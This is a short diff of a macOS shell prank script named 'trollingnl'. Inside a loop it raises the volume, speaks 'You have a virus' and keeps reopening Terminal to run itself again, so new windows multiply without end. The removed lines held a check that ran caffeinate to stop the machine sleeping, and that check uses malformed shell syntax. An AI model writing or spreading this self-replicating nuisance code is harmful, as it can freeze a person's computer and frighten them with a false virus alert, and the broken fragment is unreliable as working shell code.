@@ -14,8 +14,4 @@ osascript -e "set volume 7"
 say You have a virus
 #Self-replicate.
 open -a Terminal.app ~/trollingnl
-#Check if it's parent, and if it is, caffeinate computer
-if [ $1 := "1" ]; then
-  caffeinate
-fi
 done
